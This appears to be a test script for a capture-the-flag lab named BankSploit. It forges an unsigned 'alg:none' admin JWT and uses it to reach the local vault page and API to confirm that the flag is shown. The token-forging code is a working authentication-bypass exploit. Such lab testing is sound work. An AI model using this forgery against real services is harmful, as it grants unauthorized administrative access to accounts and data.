#!/usr/bin/env python3
"""
Test script to verify admin vault functionality.
Tests: JWT forging → Admin tab shows → Flag page accessible → Flag displays
"""

import sys
import json
import base64
import time
import urllib.request
import urllib.error
import http.cookiejar

def forge_admin_jwt(customer_id="BS100001"):
    """Forge admin JWT with alg:none"""
    h = base64.urlsafe_b64encode(b'{"typ":"JWT","alg":"none"}').rstrip(b'=').decode()
    p = base64.urlsafe_b64encode(json.dumps({
        "sub": customer_id,
        "role": "admin",
        "exp": int(time.time()) + 3600
    }).encode()).rstrip(b'=').decode()
    return f"{h}.{p}."

def test_vault_access(token, base_url="http://localhost:9443"):
    """Test accessing vault with forged JWT"""
    url = f"{base_url}/admin/vault"
    
    headers = {
        "Authorization": f"Bearer {token}",
        "User-Agent": "Test-Bot/1.0"
    }
    
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req) as response:
            html = response.read().decode()
            return {
                "status": "OK",
                "code": response.status,
                "has_flag": "BANKSPLOIT{" in html,
                "has_vault_title": "CTF Vault" in html,
                "has_copy_button": "Copy Flag" in html
            }
    except urllib.error.HTTPError as e:
        return {
            "status": "ERROR",
            "code": e.code,
            "error": str(e),
            "has_flag": False
        }
    except Exception as e:
        return {
            "status": "FAILED",
            "error": str(e),
            "has_flag": False
        }

def test_api_vault(token, base_url="http://localhost:9443"):
    """Test API vault endpoint"""
    url = f"{base_url}/api/v1/auth/vault"
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode())
            return {
                "status": "OK",
                "code": response.status,
                "has_flag": "flag" in data,
                "flag_format": data.get("flag", "").startswith("BANKSPLOIT{"),
                "response": data
            }
    except Exception as e:
        return {"status": "ERROR", "error": str(e)}

def main():
    print("[*] BankSploit Admin Vault Test")
    print("-" * 60)
    
    # Step 1: Forge JWT
    print("[1] Forging admin JWT...")
    token = forge_admin_jwt("BS100001")
    print(f"    Token: {token[:50]}...")
    print()
    
    # Step 2: Test HTML page access
    print("[2] Testing /admin/vault HTML page...")
    result = test_vault_access(token)
    print(f"    Status: {result['status']}")
    print(f"    HTTP Code: {result.get('code', 'N/A')}")
    print(f"    Has Flag: {result.get('has_flag', False)}")
    print(f"    Has Title: {result.get('has_vault_title', False)}")
    print(f"    Has Copy Button: {result.get('has_copy_button', False)}")
    print()
    
    # Step 3: Test API endpoint
    print("[3] Testing /api/v1/auth/vault API...")
    api_result = test_api_vault(token)
    print(f"    Status: {api_result['status']}")
    print(f"    HTTP Code: {api_result.get('code', 'N/A')}")
    print(f"    Has Flag: {api_result.get('has_flag', False)}")
    print(f"    Valid Format: {api_result.get('flag_format', False)}")
    if api_result.get('response'):
        print(f"    Flag: {api_result['response'].get('flag', 'N/A')}")
    print()
    
    # Summary
    print("-" * 60)
    html_ok = result.get('status') == 'OK' and result.get('has_flag')
    api_ok = api_result.get('status') == 'OK' and api_result.get('has_flag')
    
    if html_ok and api_ok:
        print("✅ ALL TESTS PASSED!")
        print("   - Admin vault HTML page accessible")
        print("   - API endpoint working")
        print("   - Flags displaying correctly")
    elif html_ok or api_ok:
        print("⚠️  PARTIAL SUCCESS")
        if html_ok:
            print("   ✓ HTML page working")
        if api_ok:
            print("   ✓ API endpoint working")
    else:
        print("❌ TESTS FAILED")
        if result.get('status') != 'OK':
            print(f"   HTML Page Error: {result.get('error', 'Unknown')}")
        if api_result.get('status') != 'OK':
            print(f"   API Error: {api_result.get('error', 'Unknown')}")

if __name__ == "__main__":
    main()
